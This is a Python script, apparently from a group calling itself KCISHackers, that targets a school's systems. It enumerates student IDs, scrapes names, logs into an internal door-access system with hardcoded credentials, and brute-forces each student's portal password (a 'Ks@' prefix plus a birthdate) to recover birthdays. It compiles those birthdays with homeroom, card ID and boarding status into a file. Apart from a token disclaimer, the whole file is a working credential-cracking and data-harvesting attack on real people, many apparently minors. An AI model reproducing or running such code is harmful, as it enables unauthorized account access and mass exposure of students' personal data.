import traceback
import json
import requests
import re
from bs4 import BeautifulSoup
import sys
import np
import time
import pypinyin
from soupsieve.util import lower

print("StudList Updating Script ver2.0 by KCISHackers in Python")
print("For learning reference only, not abusing, or you will take the risk!")
print("For more info, visit: https://www.github.com/KCISHacker/StudList")
print()
input_f = input("input file: ")
min_id = int(input("min id: "))
max_id = int(input("max id: "))
min_year = int(input("min year: "))
max_year = int(input("max year: "))
output = "data_new.json"#input("output file: ")
print()
def getName(get_id):
    try:
        req = requests.get("https://ordering.kcisec.com/chaxun.asp?kahao=" + get_id)
        reqt = req.text.encode('iso-8859-1').decode('gbk')
        soup = BeautifulSoup(reqt, 'html.parser')
        body = soup.body
        table = body.find('table', width='800')
        td = table.find('td', align='center', valign='top')
        span = td.find('span')
        span_text = span.text
        if span is None or span_text == "无此帐户，或帐户已被锁定！":
            return
        name = re.sub(r"\[.*?\](.+?) \d{4}/\d{1,2}/\d{1,2}.{4}", r"\1", span_text)
        #print("Get " + get_id + " = " + name)
        return name
    except Exception as ex:
        print()
        traceback.print_exc()
        print("Error occurred when get API for " + get_id + "!")
        print()
        return
def getPassword(q_id,min_year,max_year):
    url = "http://portal.kcisec.com/DSAI/Account/LogInCheck"
    headers = {"Accept-Language" : "en-US,en;q=0.9"}
    for yrs in range(min_year,max_year+1):
        for mth in range(1,13):
            mth_p = str(yrs) + str(mth).zfill(2)
            for days in range(1,32):
                password = mth_p + str(days).zfill(2)
                print("\rAttempting password of " + q_id + ": " + "Ks@" + password, end=" "*20)
                d = {"UserID" : q_id, "Password" : "Ks@" + password, "returnUrl" : ""}    
                r = requests.post(url, data=d, headers=headers)
                dic = json.loads(r.text)
                if dic[0]["strStatus"] == "{ok}":
                    #print("successfully finished")
                    return password
    return
def getTimeString(time):
    if time == 0:
        return "Calculating"
    if time < 1000:
        return str(round(time, 2)) + "ms"
    elif time < 60000:
        return str(round(time / 1000, 2)) + "s"
    elif time < 3600000:
        return str(round(time / 60000, 2)) + "min"
    else:
        return str(round(time / 3600000, 2)) + "h"
        
id_api_login = {
    "__VIEWSTATE": "x1ykVo8PcxjJMD7IpydQTOx8DSN21FiuS2vASjpXoLpz/+NQ5ZEx+QIevk4txXWaRMIrMAno4Wax4XakQyZrMJ1XXZwJZE7aa6CJeT7jmRM=",
    "__VIEWSTATEGENERATOR": "D303DDCD",
    "__EVENTVALIDATION": "lNfwzAejWCsuq+h1Letxpqi1O2tnRW6aMpV4uRR2JCQEvUBNCLyb/pwlF1I8Q+5kWuRCyKEuao1r2a9jzOcP2YWxGK1XqDMYJ68gjiiVdvRTaBrlrjUs4Nm7eomGJ7ISa42aTheNinBSs+Qv+BI5kPOf8xA8VJS80G7xpzTe7Y4=",
    "ctl00$MainContent$txtUserName": "Liang_zhang",
    "ctl00$MainContent$txtPassword": "1234567890",
    "ctl00$MainContent$Button1" : "%E7%99%BB%E5%85%A5"
}
id_api_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
def getCardAPI(id):
    try:
        id_api = requests.session()
        id_api.post('http://192.168.80.106/DoorReport/Login.aspx', data=id_api_login, headers=id_api_headers)
        q_u = id
        d = {
            '__LASTFOCUS': '',
            '__EVENTTARGET': 'ctl00$MainContent$TextBox_NoOrCard',
            '__EVENTARGUMENT': '',
            '__VIEWSTATE': 'QaD0l6zyqyvGYr+IUfLn1Ak8KDytRCpZvojKUiHbBVjlG2HTpmbVi3T3CjwkQBsdxUJJ1E68nMCkQtU2DRmYCGGmIErDog01zXKbNHBiCcInvsiKVQDowYCDEnghJn31JUPQDBTJDeN01EIzpCVD1yWWYQrw9QWP6RyW3ZdYyZmZursnyb+nPRaiB/ShCPT8aN4bZGEVdThNE5Cd00gUQav243h0nJf/NrAdKuX3sFU00+XsiTyXcsJrx/olHG1596pkTHnMR1oevmqrHIQJDjNRwP0WHCASspx258X9AGHbnA1q7zaW2uz+1z3ptYP7',
            '__VIEWSTATEGENERATOR': '0BF6F3BC',
            '__EVENTVALIDATION': 'q8vG4ykr3UqR2SKoRtU76FZhhzEhyAmWPa5+dedGz8RiZFG6W+0EITyiGG+0TiPAVqLpK2i1jBrOFyyFcAHarzzNs9Nb1YM07A+uHXI6ZFpnKqg/lhPxppOwA93GnoPdulsjMtSUW45QYh248npccw==',
            'ctl00$MainContent$TextBox_NoOrCard': q_u
        }
        id_api_main = id_api.post('http://192.168.80.106/DoorReport/Report_Access.aspx', data=d)
        #print(id_api_main.status_code)
        id_api_soup = BeautifulSoup(id_api_main.content, 'html.parser')
        result = id_api_soup.body.find('td', width='850px', valign='top').find('tr', bgcolor='#E3EAEB')
        if result == None:
            return None
        info = result.find_all('font')
        return info
    except Exception as ex:
        print()
        traceback.print_exc()
        print("Error occurred when get API for " + get_id + "!")
        print()
        return
total = max_id-min_id+1
start_time = time.time()
proceeded = 0
inp = []
res =[]
update_needed = {}
with open(input_f, "r", encoding="utf-8") as f:
    inp = json.load(f)
for i in inp:
    update_needed.update({i['id']: i})
#print(update_needed)
for i in range(min_id, max_id+1):
    speed = 0
    if proceeded != 0:
        speed = int(round(time.time()*1000 - start_time*1000) / proceeded)
    percentage = ""
    if total == 0:
        percentage = "100"
    else:
        percentage = str(round((i - min_id) / total, 4)*100)
        percentage_str = percentage.split('.')[0] + '.' + percentage.split('.')[1][:2]
    str_i = str(i)
    name = getName(str_i)
    old = update_needed.get(i)
    print("\rCurrent processing: {} - {} - {}% - Time remaining: {} - Already exists: {}".format(str_i, name, percentage_str, getTimeString(speed * (total - proceeded)),str(old != None)), end=" "*30)
    card = getCardAPI(str_i)
    if old != None:
        if name != None:
            if card != None:
                print()
                isBoarded = card[4].get_text() == '非走读生'
                old["homeroom"] = card[2].get_text()
                old["card_id"] = card[3].get_text()
                old["isBoarded"] = isBoarded
                old["doStayAtSelfStudy"] = True if old["isBoarded"] else card[4].get_text() == '走读B'
                res.append(old)
        continue
    if name != None and card != None:
        print()
        isBoarded = card[4].get_text() == '非走读生'
        #print("Current cracking " + name + " - " + str_i)
        name_py = pypinyin.slug(name, style=pypinyin.Style.NORMAL, separator=' ')
        #print("As in pinying: " + name_py)
        #print("Cracking password of " + str_i)
        print()
        #password = None
        password = getPassword(str_i, min_year, max_year)
        if password == None:
            print("\rUnable to crack" + str_i + "! Skip password", end = "\033[1A" + " "*100)
            print()
        else:
            print("\rCracked " + str_i + " - " + name, end = "\033[1A" + " "*100)
        res.append({'id': str_i,'name': name, 'pinyin': name_py, 'birthday': password, 'homeroom': card[2].get_text(), 'card_id': card[3].get_text(),
        'isBoarded': isBoarded, 'doStayAtSelfStudy':True if isBoarded else card[4].get_text() == '走读B' })
    proceeded += 1
with open(output, "a", encoding="utf-8") as f:
    json.dump(res, f, indent=4)
    print("\rDone writing file!" + " "*100)
    print("\033[1A\r")